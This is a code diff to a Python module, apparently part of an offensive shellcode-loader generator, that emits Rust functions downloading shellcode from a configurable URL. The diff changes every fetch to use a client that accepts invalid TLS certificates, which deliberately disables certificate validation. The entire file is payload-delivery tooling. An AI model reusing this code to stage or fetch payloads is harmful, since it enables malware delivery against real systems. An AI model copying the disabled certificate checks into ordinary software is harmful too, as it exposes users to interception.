@@ -28,7 +28,8 @@ class webdelivery:
             exit(0)
 
     def imports(self) -> list[str]:
-        return ['extern crate reqwest;']
+        return ['extern crate reqwest;',
+                'use reqwest::blocking::Client;']
 
     def compilerOptions(self) -> list[str]:
         return ['reqwest = {version = "0.13.4", features = ["blocking"]}']
@@ -41,14 +42,16 @@ class webdelivery:
         if self.shellcodeType == 'bytes':
             return f"""
 fn {self.name}() -> {self.type}{{
-    let response = reqwest::blocking::get("{self.url}");
+    let client = Client::builder().danger_accept_invalid_certs(true).build().unwrap();
+    let response = client.get("{self.url}").send();
     response.unwrap().bytes().unwrap().as_ref().try_into().unwrap()
 }}
 """
         elif self.shellcodeType == 'str':
             return f"""
 fn {self.name}() -> {self.type} {{
-    let response = reqwest::blocking::get("{self.url}");
+    let client = Client::builder().danger_accept_invalid_certs(true).build().unwrap();
+    let response = client.get("{self.url}").send();
     response.unwrap().text().unwrap()
 }}
 """
@@ -56,7 +59,8 @@ fn {self.name}() -> {self.type} {{
 
             return f"""
 fn {self.name}() -> Vec<String> {{
-    let response = reqwest::blocking::get("{self.url}");
+    let client = Client::builder().danger_accept_invalid_certs(true).build().unwrap();
+    let response = client.get("{self.url}").send();
     let responsetext = response.unwrap().text().unwrap();
     responsetext.split('\\n').map(String::from).collect()
 }}
